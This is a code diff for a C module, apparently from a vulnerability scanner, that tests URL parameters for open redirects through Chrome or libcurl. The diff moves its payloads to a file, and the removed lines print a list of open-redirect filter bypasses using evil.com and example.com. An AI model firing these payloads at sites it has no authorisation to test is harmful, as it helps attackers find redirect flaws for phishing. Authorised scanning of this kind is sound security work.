@@ -1,13 +1,11 @@
-#define _DEFAULT_SOURCE
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
 #include <unistd.h>
 #include <ctype.h>
 #include <errno.h>
 #include <curl/curl.h>
 
 #include "../../chrome/chrome.h"
+#include "../../util/util.h"
+#include "../../prox/prox.h"
 #include "oprt.h"
 
 /* ============================================================================
@@ -18,18 +16,18 @@
 #define MAX_PARAM_LEN   256
 #define MAX_PAYLOAD_LEN 2048
 #define CHROME_PORT     9222
-#define CURL_TIMEOUT    10
-#define CURL_CONNECT_TIMEOUT 5
+#define CURL_TIMEOUT 10L
+#define CURL_CONNECT_TIMEOUT 5L
 
 /* Canonical marker host — any redirect that lands here proves the bug. */
 #define MARKER_HOST      "example.com"
 #define MARKER_URL       "http://example.com/"
 
-/* Payload template file written by generate_payloads(). */
+/* Payload file — read-only from this point on. */
 #define PAYLOAD_FILE     "ghostquery/openredirect/payloads.txt"
 
 /* ============================================================================
- * Small helpers (kept self-contained to avoid pulling in gq.c statics)
+ * Small helpers
  * ============================================================================ */
 
 static void strip_nl(char *s) {
@@ -85,108 +83,75 @@ static int build_param_url(char *dst, size_t dstsz,
 }
 
 /* ============================================================================
- * Payload generation
+ * Payload loading — read the file once into memory
  * ============================================================================ */
 
 /*
- * Each payload is a URL-encoded value that, if the server redirects to
- * it naively, will land the browser on example.com. We include many known
- * bypasses for weak filters (prefix-match, substring-match, etc.).
+ * Reads every non-empty, non-comment line from PAYLOAD_FILE into a
+ * NULL-terminated array of heap-allocated strings. Caller must free
+ * with free_payloads().
  *
- * The `example.com` host is the ground truth — we never need to control
- * a server because example.com is guaranteed to resolve and return 200.
+ * Returns: number of payloads loaded, or -1 on error.
  */
-static const char *PAYLOADS[] = {
-    /* -------- direct absolute URLs -------- */
-    "http://example.com/",
-    "https://example.com/",
-    "//example.com/",                       /* protocol-relative */
-    "http:example.com/",
-    "https:example.com/",
-    "http:/example.com/",
-    "https:/example.com/",
-    "http:////example.com/",
+static int load_payloads(char ***out) {
+    *out = NULL;
 
-    /* -------- @-trick: userinfo confusion -------- */
-    "http://evil.com@example.com/",
-    "http://example.com@evil.com/",
-    "http://example.com%40evil.com/",
-    "http://evil.com%40example.com/",
-    "//evil.com@example.com/",
-
-    /* -------- backslash normalization (browsers treat \ as /) -------- */
-    "http:\\\\example.com/",
-    "http:\\example.com/",
-    "\\example.com/",
-    "\\\\example.com/",
-    "/\\example.com/",
-
-    /* -------- whitespace / control-char tricks -------- */
-    "http://example.com%09/",
-    "http://example.com%0a/",
-    "http://example.com%0d/",
-    "http://example.com%20/",
-    "http://example.com\t/",
-    "http://example.com\n/",
-
-    /* -------- scheme-relative & mixed-case -------- */
-    "HTTP://EXAMPLE.COM/",
-    "HttP://Example.Com/",
-    "hTtPs://eXaMpLe.CoM/",
-
-    /* -------- dangling scheme tricks -------- */
-    "http:///example.com/",
-    "http:////example.com/",
-    "http://example.com./",                 /* trailing-dot FQDN */
-    "http://example.com%2e/",
-    "http://example.com%00.evil.com/",
-
-    /* -------- path-relative escapes -------- */
-    "/%09/example.com/",
-    "/%2f%2fexample.com/",
-    "/%2F%2Fexample.com/",
-    "/%5cexample.com/",
-    "/..%2f..%2fexample.com/",
-
-    /* -------- prefix-based allowlist bypasses -------- */
-    /* If server checks startswith("http://example.com"), these pass: */
-    "http://example.com.evil.com/",
-    "http://example.com@evil.com/",
-    "http://example.com%2eevil.com/",
-    "http://example.com#@evil.com/",
-    "http://example.com?.evil.com/",
-    "http://example.com/../evil.com/",
-
-    /* -------- relative backslash (IE/Edge quirks) -------- */
-    "\\/example.com/",
-    "/\\/example.com/",
-    "\\\\/example.com/",
-
-    /* -------- encoded forms -------- */
-    "http%3A%2F%2Fexample.com%2F",
-    "http%3a%2f%2fexample.com%2f",
-    "%68%74%74%70%3a%2f%2f%65%78%61%6d%70%6c%65%2e%63%6f%6d%2f",
-
-    NULL
-};
-
-int openredirect_generate_payloads(void) {
-    const char *dir = "ghostquery/openredirect";
-    char cmd[512];
-    snprintf(cmd, sizeof(cmd), "mkdir -p %s 2>/dev/null", dir);
-    if (system(cmd) != 0) { /* ignore */ }
-
-    FILE *fp = fopen(PAYLOAD_FILE, "w");
+    FILE *fp = fopen(PAYLOAD_FILE, "r");
     if (!fp) {
-        fprintf(stderr, "[openredirect] cannot write %s\n", PAYLOAD_FILE);
+        fprintf(stderr, "[openredirect] cannot open %s\n", PAYLOAD_FILE);
         return -1;
     }
-    for (int i = 0; PAYLOADS[i]; i++)
-        fprintf(fp, "%s\n", PAYLOADS[i]);
+
+    int cap = 64, n = 0;
+    char **arr = malloc(sizeof(char *) * cap);
+    if (!arr) { fclose(fp); return -1; }
+
+    char line[MAX_PAYLOAD_LEN];
+    while (fgets(line, sizeof(line), fp)) {
+        strip_nl(line);
+        if (line[0] == '\0' || line[0] == '#') continue;
+
+        if (n + 1 >= cap) {
+            cap *= 2;
+            char **tmp = realloc(arr, sizeof(char *) * cap);
+            if (!tmp) {
+                for (int i = 0; i < n; i++) free(arr[i]);
+                free(arr);
+                fclose(fp);
+                return -1;
+            }
+            arr = tmp;
+        }
+
+        arr[n] = strdup(line);
+        if (!arr[n]) {
+            for (int i = 0; i < n; i++) free(arr[i]);
+            free(arr);
+            fclose(fp);
+            return -1;
+        }
+        n++;
+    }
     fclose(fp);
 
-    printf("[openredirect] wrote %d payloads to %s\n",
-           (int)(sizeof(PAYLOADS)/sizeof(PAYLOADS[0]) - 1), PAYLOAD_FILE);
+    arr[n] = NULL;
+    *out = arr;
+    return n;
+}
+
+static void free_payloads(char **arr) {
+    if (!arr) return;
+    for (int i = 0; arr[i]; i++) free(arr[i]);
+    free(arr);
+}
+
+/* Kept for API compat — no longer writes anything, just reports. */
+int openredirect_generate_payloads(void) {
+    char **p = NULL;
+    int n = load_payloads(&p);
+    if (n < 0) return -1;
+    printf("[openredirect] %d payloads available in %s\n", n, PAYLOAD_FILE);
+    free_payloads(p);
     return 0;
 }
 
@@ -199,13 +164,6 @@ static size_t discard_cb(char *p, size_t s, size_t n, void *u) {
     return s * n;
 }
 
-/*
- * Send `url` and inspect both the final URL (after redirects) and the
- * Location header of the *first* response. Returns:
- *    1  -> redirect to MARKER_HOST observed
- *    0  -> no redirect observed
- *   -1  -> transport error
- */
 static int http_probe_open_redirect(const char *url,
                                     char *final_out, size_t final_sz,
                                     char *loc_out,   size_t loc_sz) {
@@ -216,7 +174,7 @@ static int http_probe_open_redirect(const char *url,
     if (loc_out   && loc_sz)   loc_out[0]   = '\0';
 
     curl_easy_setopt(curl, CURLOPT_URL, url);
-    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 0L);  /* we want the 3xx */
+    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 0L);
     curl_easy_setopt(curl, CURLOPT_TIMEOUT, CURL_TIMEOUT);
     curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, CURL_CONNECT_TIMEOUT);
     curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L);
@@ -239,7 +197,6 @@ static int http_probe_open_redirect(const char *url,
     if (loc && loc_out && loc_sz)
         snprintf(loc_out, loc_sz, "%s", loc);
 
-    /* Follow manually once to see where it lands. */
     if (code >= 300 && code < 400 && loc) {
         CURL *c2 = curl_easy_init();
         if (c2) {
@@ -261,7 +218,6 @@ static int http_probe_open_redirect(const char *url,
             curl_easy_cleanup(c2);
         }
     } else if (code >= 200 && code < 300) {
-        /* No redirect — effective URL is the same as the request. */
         if (final_out && final_sz)
             snprintf(final_out, final_sz, "%s", url);
     }
@@ -270,24 +226,19 @@ static int http_probe_open_redirect(const char *url,
     return 0;
 }
 
-/* Case-insensitive host match: does `url` point at MARKER_HOST? */
 static int url_host_is_marker(const char *url) {
     if (!url || !*url) return 0;
 
-    /* Skip scheme */
     const char *p = strstr(url, "://");
     p = p ? p + 3 : url;
 
-    /* Skip userinfo */
     const char *at = strchr(p, '@');
     if (at) p = at + 1;
 
-    /* Compare host prefix case-insensitively */
     size_t hl = strlen(MARKER_HOST);
     for (size_t i = 0; i < hl; i++) {
         if (tolower((unsigned char)p[i]) != MARKER_HOST[i]) return 0;
     }
-    /* Must be followed by '/', ':', '?', '#', or end */
     char c = p[hl];
     return (c == '\0' || c == '/' || c == ':' || c == '?' || c == '#');
 }
@@ -296,10 +247,6 @@ static int url_host_is_marker(const char *url) {
  * Chrome-based probe
  * ============================================================================ */
 
-/*
- * Ask CDP for the current top-level URL.  Returns 1 if we got a URL and
- * wrote it into `out`, else 0.
- */
 static int cdp_current_url(chrome *c, char *out, size_t outsz) {
     if (!c || !c->use_websocket || outsz == 0) return 0;
     out[0] = '\0';
@@ -312,7 +259,6 @@ static int cdp_current_url(chrome *c, char *out, size_t outsz) {
     if (curl_ws_send(c->curl, cmd, strlen(cmd), &sent, 0, CURLWS_TEXT) != CURLE_OK)
         return 0;
 
-    /* Drain frames until we see our id with a "result" object. */
     for (int i = 0; i < 200; i++) {
         const struct curl_ws_frame *meta = NULL;
         char buf[8192];
@@ -325,7 +271,6 @@ static int cdp_current_url(chrome *c, char *out, size_t outsz) {
 
         if (!strstr(buf, "\"id\":201")) continue;
 
-        /* Extract "value":"..." — the string after the value key. */
         const char *v = strstr(buf, "\"value\":\"");
         if (!v) break;
         v += 9;
@@ -340,11 +285,6 @@ static int cdp_current_url(chrome *c, char *out, size_t outsz) {
     return 0;
 }
 
-/*
- * Navigate the current Chrome tab to `url`, wait a moment for any
- * redirects to settle, then read back location.href.
- * Returns 1 if a redirect to MARKER_HOST was observed.
- */
 static int chrome_probe_open_redirect(chrome *c,
                                       const char *url,
                                       char *final_out, size_t final_sz) {
@@ -353,7 +293,6 @@ static int chrome_probe_open_redirect(chrome *c,
 
     if (navigate_to(c, url) != 0) return 0;
 
-    /* Give Chrome time to follow any server-side redirect. */
     usleep(800000);
 
     char cur[2048];
@@ -367,24 +306,20 @@ static int chrome_probe_open_redirect(chrome *c,
  * Driver
  * ============================================================================ */
 
-/*
- * For each (param, payload) pair:
- *   1. Build a probe URL that injects payload into param.
- *   2. Send it via Chrome (preferred) or libcurl (fallback).
- *   3. If the effective/final URL points at example.com, confirm it.
- *
- * Results are appended to <path>/openredirect.txt with the format:
- *     <param> -> <payload>
- */
 int openredirect_run(char *url, char *path) {
     if (!url || !path) {
         fprintf(stderr, "[openredirect] invalid arguments\n");
         return 1;
     }
 
-    /* Ensure payload file exists. */
-    if (line_count_quick(PAYLOAD_FILE) <= 0) {
-        if (openredirect_generate_payloads() != 0) return 1;
+    /* Load payloads once into memory. */
+    char **payloads = NULL;
+    int npayloads = load_payloads(&payloads);
+    if (npayloads <= 0) {
+        fprintf(stderr, "[openredirect] no payloads loaded from %s\n",
+                PAYLOAD_FILE);
+        free_payloads(payloads);
+        return 1;
     }
 
     char param_file[4096], out_file[4096];
@@ -394,12 +329,14 @@ int openredirect_run(char *url, char *path) {
     int nparams = line_count_quick(param_file);
     if (nparams <= 0) {
         fprintf(stderr, "[openredirect] %s is empty or missing\n", param_file);
+        free_payloads(payloads);
         return 1;
     }
 
     FILE *pf = fopen(param_file, "r");
     if (!pf) {
         fprintf(stderr, "[openredirect] cannot read %s\n", param_file);
+        free_payloads(payloads);
         return 1;
     }
 
@@ -407,18 +344,20 @@ int openredirect_run(char *url, char *path) {
     if (!out) {
         fprintf(stderr, "[openredirect] cannot write %s\n", out_file);
         fclose(pf);
+        free_payloads(payloads);
         return 1;
     }
 
-    /* Try to initialize Chrome once for the whole run. */
     chrome c;
     memset(&c, 0, sizeof(c));
     int have_chrome = (init_chrome(&c, CHROME_PORT) == 0);
     if (have_chrome) printf("[openredirect] Chrome ready\n");
     else             printf("[openredirect] Chrome unavailable — using libcurl\n");
 
+    printf("[openredirect] loaded %d payloads from %s\n",
+           npayloads, PAYLOAD_FILE);
+
     char param[MAX_PARAM_LEN];
-    char payload[MAX_PAYLOAD_LEN];
     char full_url[MAX_URL_LEN];
     int  tested = 0, confirmed = 0;
 
@@ -426,12 +365,8 @@ int openredirect_run(char *url, char *path) {
         strip_nl(param);
         if (param[0] == '\0' || param[0] == '#') continue;
 
-        FILE *pl = fopen(PAYLOAD_FILE, "r");
-        if (!pl) break;
-
-        while (fgets(payload, sizeof(payload), pl)) {
-            strip_nl(payload);
-            if (payload[0] == '\0' || payload[0] == '#') continue;
+        for (int pi = 0; pi < npayloads; pi++) {
+            const char *payload = payloads[pi];
 
             char *enc = curl_easy_escape(NULL, payload, 0);
             if (!enc) continue;
@@ -472,12 +407,12 @@ int openredirect_run(char *url, char *path) {
                 printf("[openredirect] no redirect: %s=%s\n", param, payload);
             }
         }
-        fclose(pl);
     }
 
     fclose(pf);
     fclose(out);
     if (have_chrome) close_chrome(&c);
+    free_payloads(payloads);
 
     printf("[openredirect] Done. Tested %d, confirmed %d. Results: %s\n",
            tested, confirmed, out_file);
